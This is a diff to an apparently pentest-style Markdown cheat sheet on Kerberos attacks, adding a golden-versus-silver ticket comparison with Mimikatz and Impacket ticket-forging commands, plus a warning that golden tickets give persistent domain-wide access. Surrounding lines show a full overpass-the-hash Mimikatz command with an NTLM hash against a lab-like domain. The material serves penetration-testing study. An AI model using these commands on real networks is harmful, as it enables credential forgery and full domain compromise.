@@ -4,6 +4,24 @@
 
 Golden/silver tickets, pass-the-ticket, overpass-the-hash. Related: [kerberos-delegation](kerberos-delegation.md) · [kerberoasting](kerberoasting.md) · [dacl-attacks](dacl-attacks.md) · [trust-attacks](trust-attacks.md)
 
+## Contents
+- [Overpass-the-Hash](#overpass-the-hash)
+- [Ticket Handling (Rubeus)](#ticket-handling-rubeus)
+- [Golden Ticket](#golden-ticket)
+- [Silver Ticket](#silver-ticket)
+- [DCSync (dump krbtgt / any account)](#dcsync-dump-krbtgt--any-account)
+
+## Golden vs. Silver Ticket
+
+| | Golden Ticket | Silver Ticket |
+|---|---|---|
+| Forged from | `krbtgt` account's NT hash | Target *service* account's NT hash |
+| Grants access to | Any service in the domain | Only the service(s) tied to that account |
+| Requires contact with DC? | No (self-contained TGT) | No, but the targeted service will still validate the PAC in some configs |
+| Mimikatz | `kerberos::golden ... /ptt` | Same command + `/target` + `/service` |
+| Impacket | `ticketer.py -nthash <krbtgt hash> ...` | `ticketer.py -nthash <service hash> -spn <SPN> ...` |
+| Needs | Domain SID, krbtgt hash | Domain SID, service account hash, target SPN |
+
 ## Overpass-the-Hash
 ```cmd
 mimikatz.exe privilege::debug "sekurlsa::pth /user:user-dev$ /domain:inlanefreight.local /ntlm:58867088B44350772FEBDB1E3DAD7640 /run:powershell.exe" exit
@@ -51,6 +69,9 @@ Forge a golden ticket (Windows, Mimikatz).
 ticketer.py -nthash <krbtgt NT hash> -domain-sid <Domain SID> -domain <domain> <user>
 ```
 Forge a golden ticket (Linux, Impacket).
+
+> [!CAUTION]
+> A golden ticket is minted from the `krbtgt` hash and is valid domain-wide until that hash is rotated (twice, since the previous password stays valid) — this is a full, persistent domain-compromise backdoor, not a one-off credential.
 
 ## Silver Ticket
 ```cmd
